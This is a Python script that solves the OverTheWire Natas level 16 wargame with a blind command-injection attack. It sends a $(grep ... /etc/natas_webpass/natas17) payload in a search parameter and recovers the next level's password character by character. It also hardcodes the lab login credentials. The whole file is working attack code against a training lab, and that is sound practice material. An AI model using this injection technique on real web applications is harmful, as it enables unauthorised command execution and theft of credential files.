import string
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

password = "EqjHJbo7LFNb8"
allowed = string.ascii_letters + string.digits

url = "http://natas16.natas.labs.overthewire.org"

# https://www.youtube.com/watch?v=u6PiK2u-U8w WOWWWWW
with requests.Session() as session:
	while True:
		didSomething = False
		for c in allowed:
			checking = password + c
			
			payload = f"$(grep -e ^{checking}.*$ /etc/natas_webpass/natas17)Eskimo"
			params = { "needle": payload, "submit": "Search" }
			res = session.get(url, params=params, auth=auth)
			
			matched = not("Eskimo" in res.text)
			print(checking, matched)
			
			if matched:
				password += c
				didSomething = True
				break
				
		if not didSomething:
			print(password)
			break
